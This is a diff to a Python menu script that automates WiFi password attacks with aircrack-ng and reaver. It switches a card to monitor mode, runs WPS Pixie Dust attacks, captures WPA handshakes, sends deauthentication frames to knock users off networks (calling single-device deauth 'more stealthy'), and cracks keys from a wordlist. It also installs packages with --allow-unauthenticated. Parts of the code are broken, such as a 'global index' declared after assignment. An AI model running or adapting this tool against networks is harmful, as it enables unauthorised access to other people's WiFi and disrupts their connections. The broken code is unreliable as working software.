@@ -1,31 +1,28 @@
 #!/usr/bin/python3
-def depandancies():
+def depandancies(): #This is fine 
     import os,time
     print("\033[1;33;48m[-] \033[0;37;48mUpdating system and installing some dependancies. Please hold!")
-    os.system("sudo apt-get update --allow-unauthenticated > log.txt && sudo apt-get install apt -y > log.txt && sudo apt install xterm -y > log.txt")
-    os.system("xterm $HOLD -title 'Installing any dependancies [aircrack-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e sudo apt install gawk reaver aircrack-ng wireless-tools ethtool -y --allow-unauthenticated")
+    os.system("sudo apt-get update --allow-unauthenticated > log.txt && sudo apt-get install apt -y --allow-unauthenticated > log.txt && sudo apt install xterm -y --allow-unauthenticated > log.txt")
+    os.system("xterm $HOLD -title 'Installing any dependancies [aircrack-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 -y --allow-unauthenticated")
     time.sleep(2)
-def check_depends():
+def check_depends(): #Still works
     import os,time
-    array = ["xterm","gawk","reaver","aircrack-ng","wireless-tools","ethtool"]
+    array = ["xterm","gawk","reaver","aircrack-ng","wireless-tools","ethtool","apt-transport-https","iproute2"]
     for i in array[0:len(array)]:
         x = os.system("dpkg -l %s | awk -F ' ' {'print $2'} | grep -i '%s' >> log.txt" %(i,i))
         if x == 0:
             pass
         else:
             depandancies()            
-def clearScreen():
+def clearScreen(): #Needs fixing /less 
     import os
     if input("\033[1;34;48m[i] \033[1;37;48mPress 'y' to perform cleanup! >>").lower().startswith("y"):
         print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
-        if os.system("iwconfig monitor") == 0:
-            os.system("iw dev monitor del")
-        else:
-            pass
-        ar = ["wlan0","wlan1","wlan2","wlan3"]
-        for i in ar[0:len(ar)]:
-            os.system("ifconfig %s down;iwconfig %s mode managed;ifconfig %s up" %(i,i,i))
-        os.system("service network-manager restart;service wpa_supplicant restart")
+        #print("deactivating monitor mode on %s" %(index))
+        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index)) 
+        #os.system("echo 'activating NetworkManager and wpa_supplicant'")
+        os.system("sudo systemctl start NetworkManager.service")
+        os.system("sudo systemctl start wpa_supplicant.service")
         os.system("clear")
         if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
             os.system("rm log.txt")
@@ -36,7 +33,7 @@ def clearScreen():
             os.system("rm log.txt")
     else:
         clearScreen()
-def revert():
+def revert(): #revert repos is fine until apt-add solution is devised
     import os
     if os.system("ls -a backup-repos >> log.txt") == 0:
         os.system("sudo cp backup-repos/sources.list /etc/apt/sources.list")
@@ -47,7 +44,7 @@ def revert():
     else:
         print("Backup file not found!")
         clearScreen()
-def install_deps():
+def install_deps(): #Needs a little bit of work
     import os
     os.system("clear")
     print("\033[1;32;48m[+] \033[1;35;48mThis option will append a few lines to your '/etc/apt/sources.list' file.")
@@ -67,7 +64,7 @@ def install_deps():
                 if com == 0 and sou == 0:
                     print("\033[1;32;48m[+] \033[1;35;48mAPT sources successfully added. If any problems occur remove last line from '/etc/apt/sources.list' file.")
                     depandancies()
-                    print("Dependancies successfully installed! If you see errors above remove last line from '/etc/apt/sources.list' file.")
+                    print("Dependancies successfully installed! If you see errors above remove last line from '/etc/apt/sources.list' file, or use option 4 from the main-menu.")
                     clearScreen()
                 else:
                     print("Problems occured when trying to add the repos, reverting to old repo.")
@@ -87,7 +84,7 @@ def install_deps():
             clearScreen()
     else:
         install_deps()
-def reaver():
+def reaver():  #Needs major overhaul
     import os, time
     try:
         os.system('clear')
@@ -113,12 +110,15 @@ def reaver():
 
 \033[1;33;48m[info] \033[0;32;48mDeveloped by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
             print("Ok lets put a Card in monitor mode\n")
+            os.system("sudo systemctl stop NetworkManager.service")
+            os.system("sudo systemctl stop wpa_supplicant.service")
             print("\033[1;32;48m[+] \033[0;37;48myour cards are:\n ")
-            os.system("netstat -i | awk -F ' ' {'print $1'} | awk -F 'Kernel' {'print $1'} | awk -F 'Iface' {'print $1'}  | grep -Ev 'lo|eth0|ppp0|^[[:space:]]*$'")
+            os.system("ls -1 /sys/class/net | grep ^wl")
             print("\n")
             index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(copy/paste) \033[1;35;48m>> ")
             index = str(index)
-            os.system("ifconfig %s down;iwconfig %s mode monitor;ifconfig %s up" %(index,index,index))
+            global index
+            os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
             print("\033[1;34;48m[info] \033[0;32;48mOk, seems like %s is started, time to get crackin'" %(index))
             print("\033[1;34;48m[info] \033[0;37;48mNow we'll run wash to find all the wps networks around")
             print("\033[1;34;48m[info] \033[0;33;48mPlease press CTRL+C once you see your target network")
@@ -130,10 +130,10 @@ def reaver():
             c = input("\033[1;34;48m[?] \033[1;35;48mFinally tell me the channel of the target ap [look for Ch] >>")
             c = str(c)
             os.system("clear")
-            print("\033[1;34;48m[info] \033[1;37;48mOnce you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
-            print("\033[1;34;48m[info] \033[1;33;48mPlease note that this can backfire and lock the AP if left for too long")
-            print("\033[1;34;48m[info] \033[1;35;48mIt should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
             def fix():
+                print("\033[1;34;48m[info] \033[1;37;48mOnce you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
+                print("\033[1;34;48m[info] \033[1;33;48mPlease note that this can backfire and lock the AP if left for too long")
+                print("\033[1;34;48m[info] \033[1;35;48mIt should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
                 print("\033[1;34;48m\nHow do you want to run it? \033[1;32;48m[1] \033[1;34;48mto run normally or \033[1;32;48m[2] \033[0;34;48mto fix \033[1;31;48m'FAILED TO ASSOCIATE WITH AP'\033[0;34;48m")
                 opt = input("\n\033[0;33;48mChoose either 1 or 2 >>")
                 if opt == "1":
@@ -154,14 +154,11 @@ def reaver():
             reaver()
     except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
             print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
-            if os.system("iwconfig monitor") == 0:
-                os.system("iw dev monitor del")
-            else:
-                pass
-            ar = ["wlan0","wlan1","wlan2","wlan3"]
-            for i in ar[0:len(ar)]:
-                os.system("ifconfig %s down;iwconfig %s mode managed;ifconfig %s up" %(i,i,i))
-            os.system("service network-manager restart;service wpa_supplicant restart")
+            #print("deactivating monitor mode on %s" %(index))
+            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index)) 
+            #os.system("echo 'activating NetworkManager and wpa_supplicant'")
+            os.system("sudo systemctl start NetworkManager.service")
+            os.system("sudo systemctl start wpa_supplicant.service")
             os.system("clear")
             if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
                 os.system("rm log.txt")
@@ -170,7 +167,7 @@ def reaver():
                 os.system("clear")
                 title()
                 os.system("rm log.txt")
-def aircrackng():
+def aircrackng(): #Lots of effort needed 
     import os,time
     print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
     check_depends()
@@ -180,10 +177,6 @@ def aircrackng():
     while True:
         try:
             def mainScreen():
-                if os.system("iwconfig monitor") == 0:
-                    os.system("iw dev monitor del")
-                else:
-                    pass
                 print ("""
     \n\033[1;37;48m
 
@@ -201,16 +194,18 @@ def aircrackng():
                 print("\nHi, welcome to aircrack-ng made easy")
                 print("Please read everything that appears at the bottom")
                 print("Thanks for using this program")
+                os.system("sudo systemctl stop NetworkManager.service")
+                os.system("sudo systemctl stop wpa_supplicant.service")
                 print("\n\033[1;32;48m[+] \033[1;31;48myour cards are: \n")
-                os.system("netstat -i | awk -F ' ' {'print $1'} | awk -F 'Kernel' {'print $1'} | awk -F 'Iface' {'print $1'}  | grep -Ev 'lo|eth0|ppp0|^[[:space:]]*$'")
+                os.system("ls -1 /sys/class/net | grep ^wl")
                 print("\n")
                 index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(copy/paste) \033[1;35;48m>> ")
                 index = str(index)
-                os.system("iw dev %s interface add monitor type monitor" %(index))
+                global index
+                os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
                 print("\033[1;34;48m[info] \033[1;37;48m1) Ok, seems like %s is started, time to get crackin'" %(index))
                 print("\033[1;34;48m[info] \033[1;34;48m2) now, we'll run Airodump-ng to capture the handshake")
                 input("\033[1;34;48m[info] \033[1;33;48m3) once you start airodump, you need to press ctrl+c when you see your target network. \n\n\033[1;33;48m[?] press enter to continue >>")
-                index = str("monitor")
                 os.system("airodump-ng -a %s" %(index)) 
                 print("Ok, all I need is a few things from you")
                 b = input("\033[1;33;48m[?] \033[0;33;48mFirst, we'll create a new file to store the key in. What shall I call it? [no spaces/MAC addresses]>>")
@@ -220,13 +215,13 @@ def aircrackng():
                 d = input("\033[1;33;48m[?] \033[0;36;48mFinally tell me the (copy/paste) bssid of the network [no spaces]>>")
                 d = str(d)
                 if b and c and d != "":
-                    print("\033[1;34;48m[info] \033[0;31;48mNow, the idea is when someone connects/reconnects, we grab the password")
-                    print("\033[1;34;48m[info] \033[0;34;48mThat's why we need to disconnect someone. You dont have to, you can wait for someone to connect or connect manually")
-                    print("\033[1;34;48m[info] \033[0;33;48mYou can leave it blank to not disconnect anyone")
-                    e = input("\n\033[1;33;48m[?] \033[1;35;48mHow many de-auths/disconnects shall I send? Don't use '0'! >>")
+                    print("\033[1;32;48m[info] \033[0;31;48mNow, the idea is when someone connects/reconnects, we grab the password")
+                    print("\033[0;32;48m[info] \033[0;34;48mThat's why we need to disconnect someone. You dont have to, you can wait for someone to connect or connect manually")
+                    print("\033[0;37;48m[info] \033[0;33;48mYou can leave it blank to not disconnect anyone")
+                    e = input("\n\033[1;35;40m[?] \033[1;35;48mHow many de-auths/disconnects shall I send? Don't use '0'! >>")
                     e = str(e)
-                    print("\033[1;34;48m[info] \033[1;33;48mLook at the second column where it says bssid/station.")
-                    print("\033[1;34;48m[info] \033[1;30;48mIn simple terms the bssid is the wifi access point and the station is a devices connected to that network.")
+                    print("\033[0;37;48m[info] \033[1;33;48mLook at the second column where it says bssid/station.")
+                    print("\033[1;35;48m[info] \033[1;30;48mIf you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
                     print("\033[1;34;48m[info] \033[0;36;48mYou can copy/paste a station address to de-auth/disconnect a specific device rather than all devices on the network")
                     print("\033[1;34;48m[info] \033[0;37;48mThis is a more stealthy as only one device is being disconnected.")
                     print("\033[1;34;48m[info] \033[0;37;48mplease ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
@@ -235,13 +230,13 @@ def aircrackng():
                     g = str(g)
                     def post_frame():
                         print("\n\033[1;34;48m[info] \033[0;32;48mIf you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
-                        print("\033[1;34;48m[info] \033[0;36;48mFirst make sure you have a wordlist which has the password in it ")
+                        print("\033[1;32;48m[info] \033[0;36;48mFirst make sure you have a wordlist which has the password in it ")
                         print("\033[1;34;48m[info] \033[0;34;48mPlease download or locate one ")
-                        print("\033[1;34;48m[info] \033[0;33;48mHopefully the password will be in there or put it in there")
+                        print("\033[1;36;48m[info] \033[0;33;48mHopefully the password will be in there or put it in there")
                         f = input("\n\033[1;32;48m[+] \033[0;37;48mDrag the wordlist on the terminal, literally!! use the file manager! [no spaces or Tabs]>>")
                         f = str(f)
-                        print("\033[1;34;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
-                        print("\033[1;34;48m[info] \033[0;37;48mIf nothing is found then ctrl+c and try again")
+                        print("\033[1;37;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
+                        print("\033[1;30;48m[info] \033[0;37;48mIf nothing is found then ctrl+c and try again")
                         input("\033[1;33;48m[press enter]>>")
                         os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                         print("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN!")
@@ -261,9 +256,9 @@ def aircrackng():
                         post_frame()
                     def no_deauth():
                         os.system('clear')
-                        print("\033[1;34;48m[info] \033[0;34;48mOk, you have chosen not to disconnect anyone.")
-                        print("\033[1;34;48m[info] \033[0;36;48mYou need to wait for someone to connect or connect manually yourself")
-                        input("\033[1;34;48m[info] \033[0;33;48mReady? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
+                        print("\033[1;37;40m[info] \033[0;34;48mOk, you have chosen not to disconnect anyone.")
+                        print("\033[1;33;48m[info] \033[0;36;48mYou need to wait for someone to connect or connect manually yourself")
+                        input("\033[1;36;48m[info] \033[0;33;48mReady? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
                         os.system("\niwconfig %s channel %s" %(index,c))
                         os.system("\nairodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s" %(b,c,d,index))
                         post_frame()
@@ -279,11 +274,9 @@ def aircrackng():
             mainScreen()
         except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
             print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
-            
-            if os.system("iwconfig monitor") == 0:
-                os.system("iw dev monitor del")
-            else:
-                pass
+            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
+            os.system("sudo systemctl start NetworkManager.service")
+            os.system("sudo systemctl start wpa_supplicant.service")
             os.system("clear")
             if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
                 os.system("rm log.txt")
@@ -292,7 +285,7 @@ def aircrackng():
                 os.system("clear")
                 title()
                 os.system("rm log.txt")
-def title():
+def title(): #Works so far
     try:
         import os
         os.system('clear')
@@ -302,6 +295,7 @@ def title():
         print("\033[1;37;48mType [3] - Add the Kali-Rolling Sources and install any dependancies")
         print("\033[1;31;48mType [4] - If you used option [3] and APT broke, use this to fix it")
         print("\033[1;33;48mType [5] - Update and upgrade all system packages")
+        print("\n\n\033[1;37;40mType [99] - Exit ")
         selection = input("\033[0;35;48m\nPress 1, 2, 3, 4 or 5 >>")
         if selection == "1":
             aircrackng()
@@ -314,7 +308,7 @@ def title():
         elif selection == "5":
             import os
             os.system("clear")
-            if input("\033[0;32;48m\n[+]\033[0;34;48mUpdate system and perform full-update to system? \033[0;32;48m [y/n]\033[0;34;48m>>").lower().startswith("y"):
+            if input("\033[0;32;48m\n[+]\033[0;34;48mUpdate system and perform full-upgrade to system? \033[0;32;48m [y/n]\033[0;34;48m>>").lower().startswith("y"):
                 os.system("sudo apt-get install xterm apt >> log.txt -y --allow-unauthenticated")
                 os.system("sudo xterm $HOLD -title 'Updating, do not close!'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'apt update --allow-unauthenticated;apt full-upgrade -y --allow-unauthenticated;apt autoclean;apt autoremove -y --allow-unauthenticated' ")
                 print("\033[0;32;48mSystem is up to date, Goodbye!")
@@ -322,6 +316,14 @@ def title():
                 os._exit(1)
             else:
                 title()
+        elif selection == "99":
+            import os
+            log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
+            if log == 0:
+                os.system("rm log.txt")
+            else:
+                pass
+            os._exit(1)
         else: 
             os.system('clear')
             title()
@@ -334,3 +336,4 @@ def title():
             pass
         os._exit(1)
 title()
+
